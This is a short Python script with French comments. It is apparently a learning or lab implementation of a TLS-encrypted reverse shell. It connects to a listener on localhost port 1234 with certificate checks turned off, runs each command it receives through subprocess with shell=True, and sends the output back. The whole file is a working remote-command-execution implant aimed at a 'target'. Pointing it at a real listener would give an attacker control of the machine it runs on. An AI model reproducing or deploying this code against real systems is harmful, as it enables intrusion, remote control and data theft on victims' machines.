# import des librairies suivantes :
# socket = communication entre l'attaquant et la cible
# ssl = chiffrement des échanges
# subprocess = exécution des commandes
# os = manipulation des commandes de l'OS
import socket
import ssl
import subprocess
import os

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname='localhost')
wrappedSocket.connect(('localhost', 1234))

try:
   while True:
        received_data = wrappedSocket.recv(4096)
        # Send the output of the command over the SSL connection
        # Execute a system command

        command = subprocess.Popen(received_data.decode().split(),shell=True,stdout=subprocess.PIPE)
        output, err = command.communicate()
        wrappedSocket.sendall(output)
finally:
    wrappedSocket.close()